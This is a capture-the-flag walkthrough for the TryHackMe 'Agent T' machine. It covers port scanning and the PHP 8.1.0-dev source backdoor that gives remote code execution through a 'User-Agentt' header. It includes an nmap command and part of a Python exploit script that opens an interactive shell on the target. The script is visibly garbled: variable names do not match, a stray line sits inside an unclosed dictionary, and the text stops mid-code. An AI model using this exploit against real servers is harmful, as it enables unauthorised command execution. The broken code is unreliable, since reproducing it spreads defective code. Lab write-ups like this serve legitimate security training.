# TryHackMe - Agent T

**Machine Name:** Agent T  
**Difficulty:** Easy  
**Category:** Web Exploitation / CVE  
**IP Address:** 10.80.164.94

---

## Description
Agent T is a boot-to-root TryHackMe challenge that focuses on identifying underlying server technologies and leveraging known vulnerabilities. The challenge highlights the dangers of running bleeding-edge, unverified development software in a production environment—specifically a compromised version of PHP.

## Enumeration

### Port Scanning
I began with an aggressive `nmap` scan to enumerate open services and identify versions:
```bash
nmap -p- -sV -sC -Pn --min-rate 1000 10.80.164.94 
```

**Findings:**
* **Port 80 (HTTP):** Open. Running `PHP cli server 5.5 or later (PHP 8.1.0-dev)`. The site title is "Admin Dashboard".

### Web Exploration (Port 80)
While the scan performed, I manually checked the website. The main dashboard loaded normally, but clicking the main button redirected to `/index.html`, which returned a "Not Found" error. Digging around the visible web pages didn't yield much.

However, reviewing the Nmap scan revealed a massive red flag in the HTTP headers: **PHP 8.1.0-dev**.

## Exploitation: PHP 8.1.0-dev Backdoor
After a quick Google search for `PHP 8.1.0-dev exploit`, I discovered that an early release of this specific development version was compromised on March 28th, 2021. Malicious actors committed a backdoor directly into the PHP source code.

The backdoor allows an attacker to achieve Remote Code Execution (RCE) by sending a custom HTTP header (`User-Agentt` with two 't's) containing the command to be executed.

I found a Python exploit script that automates this process and saved it locally:
```python
#!/usr/bin/env python3
import os
import re
import requests

host = input("Enter the full host url:\n")
trequest = requests.Session()
dresponse = request.get(host)
if str(response) == '<Response [200]>':
    print("\nInteractive shell is opened on", host, "\nCan't acces tty; job crontol turned off.")
    try:
        while 1:
            cmd = input("$ ")
            headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
defaultheaders = {
